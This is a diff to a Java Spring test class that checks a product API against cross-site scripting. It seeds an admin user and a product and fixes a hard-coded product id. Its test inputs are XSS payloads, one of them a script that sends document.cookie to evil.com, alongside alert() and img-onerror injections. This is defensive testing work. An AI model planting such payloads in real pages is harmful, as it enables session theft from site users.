@@ -41,10 +41,38 @@ public class XssSecurityTest {
     @Autowired
     private ObjectMapper objectMapper;
 
+    @Autowired
+    private com.flogin.repository.interfaces.UserRepository userRepository;
+
+    @Autowired
+    private com.flogin.repository.interfaces.ProductRepository productRepository;
+
+    @Autowired
+    private org.springframework.security.crypto.password.PasswordEncoder passwordEncoder;
+
     private String authToken;
+    private Long productId;
 
     @BeforeEach
     void setUp() throws Exception {
+        productRepository.deleteAll();
+        userRepository.deleteAll();
+
+        com.flogin.entity.User admin = new com.flogin.entity.User();
+        admin.setUserName("admin");
+        admin.setEmail("admin@example.com");
+        admin.setHashPassword(passwordEncoder.encode("admin123"));
+        userRepository.save(admin);
+
+        com.flogin.entity.Product product = new com.flogin.entity.Product();
+        product.setProductName("Test Product");
+        product.setPrice(100.0);
+        product.setQuantity(10);
+        product.setDescription("Test Description");
+        product.setCategory("Electronics");
+        product = productRepository.save(product);
+        productId = product.getId();
+
         LoginRequest loginRequest = new LoginRequest("admin", "admin123");
 
         String response = mockMvc.perform(post("/api/auth/login")
@@ -86,7 +114,7 @@ public class XssSecurityTest {
     @Test
     @DisplayName("TC1.2: Stored XSS - Script tag trong description")
     void testXss_StoredXss_ScriptTag_Description() throws Exception {
-        CreateProductRequest xssRequest = new CreateProductRequest("Test Product", 100.0, "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>", 10, "Electronics");
+        CreateProductRequest xssRequest = new CreateProductRequest("Test Product 1.2", 100.0, "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>", 10, "Electronics");
 
         mockMvc.perform(post("/api/products")
                 .header("Authorization", authToken)
@@ -301,7 +329,7 @@ public class XssSecurityTest {
     void testXss_UpdateProduct() throws Exception {
         UpdateProductRequest xssRequest = new UpdateProductRequest("<script>alert('XSS')</script>", 200.0, "<img src=x onerror=alert('XSS')>", 20, "Electronics");
 
-        mockMvc.perform(put("/api/products/1")
+        mockMvc.perform(put("/api/products/" + productId)
                 .header("Authorization", authToken)
                 .contentType(MediaType.APPLICATION_JSON)
                 .content(objectMapper.writeValueAsString(xssRequest)))
